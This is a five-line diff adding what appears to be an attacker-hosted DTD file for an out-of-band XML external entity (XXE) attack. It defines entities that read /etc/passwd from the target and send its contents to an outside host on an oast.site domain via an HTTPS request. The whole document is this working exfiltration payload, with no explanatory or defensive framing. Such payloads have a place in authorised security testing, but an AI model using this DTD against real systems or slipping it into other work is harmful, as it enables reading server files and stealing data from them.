@@ -1,0 +1,5 @@
+<!-- xxe.dtd on your server -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://dbqf9d2f3jvlnk0srb7g4ebf9m1srqbba.oast.site/?x=%file;'>">
+%eval;
+%exfil;
